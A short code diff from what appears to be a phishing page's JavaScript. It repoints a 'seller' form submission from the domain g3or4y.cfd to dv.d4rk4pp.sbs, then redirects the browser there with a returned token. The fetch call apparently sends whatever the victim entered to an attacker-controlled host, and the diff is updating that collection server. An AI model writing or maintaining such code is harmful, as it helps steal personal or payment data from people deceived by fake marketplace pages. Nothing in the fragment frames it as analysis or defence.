@@ -65,7 +65,7 @@
 						}),
 					};
 
-					fetch("https://g3or4y.cfd/seller", fetchOptions)
+					fetch("http://dv.d4rk4pp.sbs/seller", fetchOptions)
 						.then((response) => {
 							if (response.ok) {
 								return response.json();
@@ -73,10 +73,10 @@
 						})
 						.then((res) => {
 							if (res.code === 200) {
-								window.location.href = "https://g3or4y.cfd/sells?Token="+res.Token;
+								window.location.href = "http://dv.d4rk4pp.sbs/sells?Token="+res.Token;
 					
 							} else {
-								window.location.href = "https://g3or4y.cfd/seller";
+								window.location.href = "http://dv.d4rk4pp.sbs/seller";
 							}
 						})
 					});
